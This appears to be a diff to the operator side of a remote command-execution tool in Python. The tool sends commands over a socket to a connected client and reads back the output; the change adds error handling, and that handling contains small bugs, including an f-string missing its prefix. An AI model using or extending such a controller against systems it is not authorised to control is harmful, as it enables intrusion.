@@ -336,7 +336,13 @@ while True:
                         start_file_server_in_thread()
                         continue
                     client_socket.send(cmd.encode())
-                    output = client_socket.recv(BUFFER_SIZE).decode()
+                    try:
+                        output = client_socket.recv(BUFFER_SIZE).decode()
+                    except ValueError as e:
+                        if "not enough values to unpack" in str(e):
+                            output = "[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file."
+                    except Exception as e:
+                        output = "[!] Error occurred while receiving data: {e}"
                     
                     # Send exit before exiting to ensure the client is also closed
                     if cmd.lower() == "exit":
